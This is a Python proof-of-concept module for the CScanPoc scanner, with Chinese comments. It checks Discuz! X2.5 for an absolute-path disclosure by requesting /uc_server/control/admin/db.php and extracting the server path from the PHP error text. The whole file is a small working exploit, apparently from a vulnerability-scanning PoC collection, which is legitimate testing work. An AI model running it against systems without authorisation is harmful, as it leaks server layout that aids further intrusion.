# coding: utf-8
import re

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Discuz_0102'  # 平台漏洞编号，留空
    name = 'Discuz X2.5 /uc_server/control/admin/db.php 路径泄露'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2015-06-25'  # 漏洞公布时间
    desc = '''
    discuz X2.5 存在多处绝对路径泄露。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Discuz!'  # 漏洞应用名称
    product_version = 'X2.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd9ed8d71-344c-4449-a450-6aa901c66888'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = r'/uc_server/control/admin/db.php'
            verify_url = self.target + payload
            req = requests.get(verify_url)
            pathinfo = re.compile(r'not found in <b>(.*)</b> on line')
            match = pathinfo.findall(req.text)
            if match:
                path = match[0]
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            payload = r'/uc_server/control/admin/db.php'
            verify_url = self.target + payload
            req = requests.get(verify_url)
            pathinfo = re.compile(r'not found in <b>(.*)</b> on line')
            match = pathinfo.findall(req.text)
            if match:
                path = match[0]
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;获取到的信息:path={path}'.format(
                    target=self.target, name=self.vuln.name, path=path))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))


if __name__ == '__main__':
    Poc().run()
